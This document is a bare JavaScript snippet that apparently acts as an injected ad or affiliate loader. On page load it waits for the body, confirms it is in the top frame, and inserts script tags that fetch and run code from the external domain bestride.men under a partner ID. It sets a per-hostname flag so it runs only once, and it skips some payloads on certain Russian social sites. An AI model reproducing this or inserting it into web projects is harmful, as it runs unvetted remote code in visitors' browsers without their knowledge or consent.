(function() {
  var t = false;

  function r() {
    var t = 1;
    var r = parseInt("399020");
    var e = [{
      src: "//bestride.men/code/pid/linkcheck.js?rev=358",
      async: false
    }, {
      src: "//bestride.men/code/pid/399020_BNX.js?rev=358",
      async: false
    }, {
      src: "//bestride.men/code/pid/399020_ALL.js?rev=358",
      async: false
    }];
    var n = false;
    var i = [359045, 976154];
    var a = [581350, 655971, 812933, 535264, 330970, 888078, 612812, 552308, 516442, 144200, 378507, 820585];
    if (window.location.host.match(/(mail\.ru|ok\.ru|vk\.com)/) && a.indexOf(r) > -1) {
      e[1].src = null
    }
    if (r == 485743) {
      e[0].src = null
    }
    if (i.indexOf(r) > -1) {
      e = []
    }
    if (t === 1) {
      var c = window[window.location.hostname] || false;
      if (c) return;
      window[window.location.hostname] = true
    }
    for (var o = 0; o < e.length; o++) {
      if (e[o].src) {
        var s = document.createElement("script");
        s.setAttribute("charset", "UTF-8");
        if (e[o].async) s.setAttribute("async", "async");
        s.setAttribute("src", e[o].src);
        try {
          var d = document.body.firstChild;
          d.parentNode.insertBefore(s, d)
        } catch (t) {
          n = true
        }
        if (n) {
          try {
            document.body.appendChild(s)
          } catch (t) {}
        }
      }
    }
  }
  var e = function() {
    if (!t) {
      setTimeout(function() {
        n()
      }, 10)
    }
  };
  var n = function() {
    try {
      if ("function" == typeof document.body.appendChild && window === top) {
        t = true;
        r()
      }
    } catch (t) {}
    e()
  };
  n()
})();
